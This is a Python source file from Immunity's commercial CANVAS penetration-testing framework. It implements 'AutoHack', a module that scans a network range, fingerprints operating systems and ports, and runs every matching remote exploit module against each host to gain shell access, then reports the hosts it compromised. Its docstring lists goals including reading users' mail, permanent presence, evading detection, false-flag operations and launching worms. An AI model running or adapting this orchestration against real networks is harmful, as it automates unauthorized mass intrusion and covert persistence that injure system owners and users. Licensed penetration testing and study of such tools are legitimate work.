#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
 autohack.py

Given a list of hostnames/ips/networks
AND MISSION
Mission examples:
    1. Read mail of X user set
    2. Obtain access to host
    3. Obtain as much access as possible (recon)
AND COVERTNESS:
    1. Avoid being caught at all costs
    ...
    10. Go nuts.
AND bouncehostlist of previously owned hosts which we can use to bounce off
or netmask of hosts to hack to obtain bouncehosts www.cn.com/24, etc.

1. Does preliminary look at the hosts to find high-priority hosts
2. Scans those hosts
3. Obtains access to hosts and conducts recon
4. Establishes permanent presense on those hosts
5. Explores wisely using bounce hosts (or NOT reusing them), technologies, and other methods for covertness
6. Monitors listening posts and conducts collection against them
7. Attempts to use sniffed passwords/etc to broaden access
8. Attempts to discover if it has been found
9. Launches AO worms
10. Runs false-flag operations
11. Makes corrolations between users and connectivity
  1. If I see a user "bobr" on two different hosts, then I can guess that is the
  same user, with the same password and these machines are related. If bobr and
  samr are known to be related, then I attach more signifigance to owning the
  servers bobr is on to get to samr, my real target.
12. Adds to bouncehostlist
13. Can be paused, restarted, etc.
14. Conducts web attacks, recon from various things it can discover via spidering, google groups, etc
15. Guesses the network policy - for firewalls, it's usefull to know what ports are allowed
and do gap analysis as time goes on. For client side hacking, it's good to already know
what the proxies are, etc.
16. Draws network diagrams and timelines.



"""

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
if "." not in sys.path: sys.path.append(".")


from exploitutils import *
from tcpexploit import tcpexploit
from exploitmanager import exploitmanager
import CANVASNode
import canvasengine
import libs.canvasos as canvasos

import logging

DOCUMENTATION           = {}
DOCUMENTATION["Notes"]  = """Automatically will portscan and attack all the boxes it can find
within the netrange you specify. Portscanning can take a VERY long time if
covertness is 11. You might try setting it to 5.
"""


NAME                    = "AutoHack"
DESCRIPTION             = "Try to hack into the given target"

VERSION                 = "2.0"

PROPERTY                = {}
PROPERTY['TYPE']        = "Tools"

CHANGELOG = """
2.0
Created by Rich 6/11/08.
"""


class AutoHackError(Exception):
    pass

def isexploit(module):
    """
    Returns true if the module is a remote exploit. We don't
    want to run non-exploits, because that's a waste of time.
    """
    if hasattr(module,"PROPERTY"):
        if module.PROPERTY.get('SITE', '^_^') == "Remote":
            return True
    return False

UNKNOWN = 0
WIN     = 1
UNIX    = 2

# set the SCAN version here

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.onlymodule="" #set this if you want autohack to only do one module
        #this is useful when you're testing autohack with just lsass for example
        self.name = NAME
        self.setPort(0)
        self.setHost("")
        self.setVersion(0)
        self.badstring="\x00\r\n\t %"
        self.searchbadstring="\x00\\/.:$"
        self.istest=0
        self.setVersions()
        self.shellcode="A"
        self.localhost=""
        self.localport=0
        self.ssl=0
        self.doshell=1
        self.usedvuln=None #vulnerability we succeeded with
        self.force=0
        self.progress=0
        self.setVersions()
        self.exploit_modules=[]
        self.recon_version = 1
        self.exploits=[]
        self.netmask="32"
        self.result=[] #list of (host,vuln) used to own it
        self.lowport=1
        self.highport=1024
        self.portscantype="fast"
        self.ignore_unidentified_hosts=1
        self.portscan=0 #default to no portscan
        self.web_ports = [80,8000,8080,443]#If target does not have any of these ports open we skip the web exploit modules
        self.banned = []
        return

    def build_autohack_list(self, ban_types=["DoS","Tools","Recon"]):
        """
        Autogenerate the list of modules to include in autohack

        *If your exploit is unreliable then set the AUTOHACK_EXCLUDE key in its properties*
        """
        self.autohack_dict={}
        e_modules=canvasengine.exploitmodsGet()
        for exploit_mod in e_modules.values():

            ##Are we a known class of stuff that should be excluded?
            if exploit_mod.PROPERTY["TYPE"] in ban_types:
                self.banned.append(exploit_mod.NAME.lower())
                continue

            ##Have we declared that this shouldn't be included in the PROPERTY dict
            elif exploit_mod.PROPERTY.has_key("AUTOHACK_EXCLUDE"):
                self.banned.append(exploit_mod.NAME.lower())
                continue

            ##Use this exploit in autohack
            else:
                self.autohack_dict[exploit_mod.NAME.lower()]=exploit_mod

        # self.log("Modules INCLUDED in autohack: %s"%(self.autohack_dict))
        return

    def setTest(self,test):
        self.istest=test
        return

    def setVersions(self):
        self.versions={}
        self.versions[0]=("Automatically determine version type",UNKNOWN)
        self.versions[1]=("Windows NT SP6A",WIN)
        self.versions[2]=("Windows 2000 SP1", WIN)
        self.versions[3]=("Windows 2000 SP2",WIN)
        self.versions[4]=("Windows 2000 SP3",WIN)
        self.versions[5]=("Windows 2000 SP4",WIN)
        self.versions[6]=("Windows XP SP1",WIN)
        self.versions[7]=("Windows XP SP2",WIN)
        self.versions[8]=("Windows Server 2003" ,WIN)
        self.versions[9]=("Linux",UNIX)
        self.versions[10]=("Mandrake Linux",UNIX)
        self.versions[11]=("Suse Linux", UNIX)
        self.versions[12]=("Red Hat Linux", UNIX)
        self.versions[13]=("Debian Linux", UNIX)
        self.versions[14]=("Solaris 2.6", UNIX)
        self.versions[15]=("Solaris 7", UNIX)
        self.versions[16]=("Solaris 8", UNIX)
        return

    def getAffectsList(self, myos):
        myos = str(myos).upper()

        # altered for PROPERTY, win32 is still on affectsList
        if myos.find("WIN") > -1:
            return "Windows"
        elif myos.find("LINUX") > -1:
            return "Linux"
        elif myos.find("SOLARIS") > -1:
            return "Solaris"
        elif myos.find("FREEBSD") > -1:
            return "FreeBSD"
        elif myos.find("MAC OS X") > -1:
            return "MacOSX"
        elif myos.find("AIX") > -1:
            return "AIX"
        elif myos.find("EMBEDDED") > -1:
            return "Embedded"
        elif myos.find("CISCO") > -1:
            return "Cisco"
        else:
            return "Unknown"

    def doRecon(self, module, target):
        self.log("Doing recon with %s"%module)
        scan=canvasengine.getModuleExploit(module)
        scan.link(self)
        scan.argsDict["postscan"]="ifids" #do ifids afterwards if possible
        if self.portscantype=="fast":
            #add the ports you want to portscan here...we pass this as a list to the portscanner
            scan.argsDict["mode"]="chosen ports"
            scan.argsDict["allports"]=range(1,1025)+[7100]
        #if we're running locally on a windows or cygwin box, then
        #we need to set covertness to 10 so that the portscan doesn't
        #take forever
        #if self.argsDict["passednodes"][0].nodetype=="LocalNode" and os.name.lower() in ["nt"]:
        #    scan.covertness=10
        #    self.log("Set covertness to 10 for Windows user.")
        scan.target = target
        scan.run()
        return scan.result

    def getListener(self, app):
        """
        Gets the listener for the exploit to use - we can have many different
        kinds of listeners since each exploit can have a different one.

        Returns -1 on failure (extremely rare).
        Returns none if no listener is needed
        returns a listener otherwise
        """
        neededtypes=app.neededListenerTypes()
        if neededtypes!=[]:
            listener= self.engine.autoListener(None, neededtypes[0])
            if listener==None: #still none? Then print error message
                self.engine.log("You need to select a valid listener %s for this exploit! (Is it blue?)"%(app.neededListenerTypes()))
                self.log("Returning from runExploit()")
                return -1
            #print "Setting listener %s argsdict to %s"%(listener, app.listenerArgsDict)
            listener.argsDict=app.listenerArgsDict

        else:
            listener=None
        app.callback=listener #note: this is a listener, not an interface!
        return listener

    def runExploit(self, app):
        """
        run the exploit , including set up the listeners it needs for callbacks
        """
        #we're single threaded so we can feel free to use this
        #self.variable for the manager
        ret = self.manager.run()
        self.exploits.append(app)

        ##Did we succeed in exploiting the box ?
        if isinstance(ret, CANVASNode.CANVASNode) or app.ISucceeded():
            devlog("autohack", "Exploit returned %s"%ret)
            self.log("Finished runExploit in autohack successfully!")
            return ret
        return None

    def setExploit(self, app, app_class):
        app.argsDict = self.argsDict
        app.argsDict["passednodes"] = self.argsDict["passednodes"]
        app.argsDict["port"]= str(app.port)
        app.argsDict["autohack_state"]=self.autohack_state
        app.target = self.target

        app.setId(self.engine.getNewListenerId())
        app.engine = self.engine
        app.setLogFunction(self.engine.exploitlog)
        app.setDebugFunction(self.engine.exploitdebuglog)
        app.setInfo(app.getInfo())
        #self.engine.addExploitLine(app)
        app.setCovertness(self.engine.getCovertness())
        self.manager=exploitmanager(app, self.engine)

        return self.manager

    def run_on_host(self,target):
        if self.version == 0:
            kprim=target.get_knowledge("OS")
            if kprim== None:
                self.set_current_attack_module("osdetect")
                self.doRecon("osdetect", target)
                self.set_current_attack_module("autohack")
                kprim=target.get_knowledge("OS")

            if kprim:
                myos=kprim.known
            else:
                myos="UKNOWN" # This is not supposed to happen
            if (myos=="UNKNOWN" or str(myos)=="") and self.ignore_unidentified_hosts:
                self.log("Ignoring host %s since it cannot be os-id'd"%self.host)
                return 0
        elif self.version == 1:
            # Create a new canvasos object set to Windows
            # XXX: JMS - is this a sane default? Perhaps 2k3?
            myos = canvasos.new("Windows")
        else:
            # Create a default Linux canvasos object
            myos = canvasos.new("Linux")

        objos = myos
        myos = str(myos) #switch this to a string, even though it is an object that is returned
        self.log("Os detected: %s" % myos)

        #now check netbios if available against engine's smartlist
        #assuming self.engine exists and is initialized
        allKnowledge=target.get_all_knowledge_as_text()
        self.log("All Knowledge=%s"%allKnowledge)

        netbios=target.get_knowledge("SMBServer",None)
        dontattack=False
        if netbios:
            dontattack=self.engine.smartlist.check_netbios(netbios)
        if dontattack:
            self.log("SmartList check told me not to attack this host")
            return 0

        if myos.count("Unknown"):
            logging.critical("OS is Unknown, exiting")
            return 0

        if int(self.argsDict.get("portscan", 1)):
            self.doRecon("portscan", target)

        #theoretically could do a portscan to filter this list down
        #with mode="chosen ports"

        kprim = target.get_knowledge("TCPPORTS")
        openports=[]

        if kprim and isinstance(kprim.known, list):
            openports = kprim.known
            #need to convert this to a list of integers, if it's not
            #already. In our knowledge base this is stored as a list of strings
            #instead
            openports = map(int, openports)
        else:
            #just some default ports
            openports=[135, 139, 143, 161, 445, 80, 21, 25, 23, 7100]

        self.log("Open Ports: %s" % openports)

        ##Rich mod - if no 'web ports' are open remove any exploits that are web exploits
        if 0:
            if not set(self.web_ports).intersection(openports):
                self.log("No ports defined as web ports (%s) in open port list"%(self.web_ports))
                ##Rebuild list defining webexploits as banned type
                self.build_autohack_list(ban_types=["DoS","Tools","Recon", "Web Exploits"])

        affected = self.getAffectsList(myos)
        if affected == "Unknown":
            logging.critical("Unsupported OS (%s), exiting")
            return 0

        ##Do we have an explicit list of modules ala VulnAssess2 or just do all we can ala massattack2 ?
        if self.exploit_modules:
            exploitmods = {}
            self.log("Using a list of exploit modules that was passed into us: %s"%repr(self.exploit_modules))
            if type(self.exploit_modules) == type(""):
                #this should never happen, but I added it for "hardness"'s sake
                self.exploit_modules=self.exploit_modules.split(",")
            for mod in self.exploit_modules:
                exploitmods[mod]=canvasengine.getModule(mod)
        else:
            exploitmods = canvasengine.exploitmodsGet()

        # if 1:
            #debug
            # for mod in exploitmods:
                # self.log("Loaded: %s"%(str(mod)))

        totalmods=len(exploitmods)
        currentmod=1
        self.log("Testing against: ")

        for module in exploitmods.values():
            if self.state == self.HALT:
                break

            #run all the exploits on this host
            if hasattr(module, "NAME"):
                name = module.NAME #save this off
            else:
                raise Exception, "Module %s does not have a NAME" % str(module)

            goodOS = False
            for tos in module.TARGET_CANVASOS_LIST:
                if objos.isSameAs(tos):
                    goodOS = True
                    break

            if not goodOS:
                # self.log("Autohack considered module %s not suitable for remote os %s"  % (module.NAME, objos))
                continue
            if name.lower() in self.banned:
                # logging.warning("Module %s is banned" % name)
                continue
            if not isexploit(module):
                continue

            logging.info("Executing (%s)" % name)

            progress = round((currentmod * 100) / totalmods)
            # self.log("CurrentMod %d Total Modules: %d Progress %d" % (currentmod, totalmods, progress))
            self.setProgress(progress)
            currentmod += 1
            try:
                self.set_current_attack_module(name)
                app = module.theexploit()
            except:
                logging.error("theexploit class not found in module %s" % name)
                continue

            app.link(self)
            self.log("openports = %s" % openports)
            if app.port not in openports and app.port != 0:
                self.log("Port %s not in %s" % (app.port, openports))
                self.log("Skipped module %s" % name)
                continue

            try:
                manager = self.setExploit(app, module)
                if manager.test():
                    vuln = "Vulnerable"
                else:
                    vuln = "Not Vulnerable"
                    self.log("(%s) %s: Possible %s" % (app.port, module.NAME, vuln))
                    continue

            except:
                import traceback
                print "\t ==> Error"
                traceback.print_exc(file=sys.stderr)
                continue

            ret = self.runExploit(app)

            # The exploit returned us the result no need to do anything further
            if type(ret) == str:
                return ret

            print "RET:"
            print ret

            if app.ISucceeded():
                self.log("Exploit returned %s"%ret)
                self.target.add_knowledge("Exploited using", app.name, 100)
                self.log("Exploited using %s!"%app.name)
                newnode=ret
                if newnode in [0,1,None]:
                    #BUG BUG what if exploit returned multiple nodes?
                    self.log("Exploit succeeded but did not return a node - getting new node from exploit manager")
                    #we sleep until the manager has finished waiting for the new node
                    #to be set up. He'll only wait if there was a callback
                    #which means things like dcedump don't mess with us here.
                    #any exceptions in manager.run() might though, so we have to be careful of that
                    while self.manager.state!="Done":
                        time.sleep(1)
                    newnode=self.manager.newnode
                    if not newnode:
                        self.log("Did not get a node from the exploit")
                    else:
                        self.log("Got node from callback!")
                else:
                    self.log("Target returned a node of type %s"%newnode.nodetype)
                self.result+=[(target,app.name,newnode)]
                #we don't return ret because startup has already been called on it
                return 1

        return 0

    def getargs(self):
        self.netmask                   = self.getarg("netmask").replace("/","")
        self.host                      = self.target.interface
        self.ignore_unidentified_hosts = self.getarg("ignore_unidentified_hosts")
        self.portscan                  = int(self.getarg("portscan"))
        self.maxthreads                = int(self.getarg("maxthreads"))
        self.getarg("exploit_modules")
        return

    def run(self):
        self.getargs()
        self.log("Netmask=%s"%self.netmask)
        self.setInfo("%s attacking %s/%s"%(self.name,self.host,self.netmask))
        ##Load all modules - though this should have been done on start up
        if not canvasengine.registeredallmodules:
            canvasengine.registerAllModules()

        ##Find the subset of modules we actually want to run - no DoS etc
        self.build_autohack_list()

        ##GO! this methos is in canvasexploit superclass, which calls back into the run_on_host method above
        ret=self.run_on_all_alive_hosts()

        ##Display pretty stuffs
        if not len(self.result):
            logging.warning("Report is empty, either no module was run or we got no results")
        else:
            self.log("Autohack report:")

            for host, vuln, newnode in self.result:
                self.log("Used %s on %s" % (vuln, host.interface))
                self.usedvuln=vuln

            self.log("End of autohack report")

        #print "Ret=%s"%ret #this is theexploit instance?!?
        self.setInfo("%s finished attacking %s/%s" % (self.name, self.host, self.netmask))
        return ret

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])


#this stuff happens.
if __name__ == '__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)
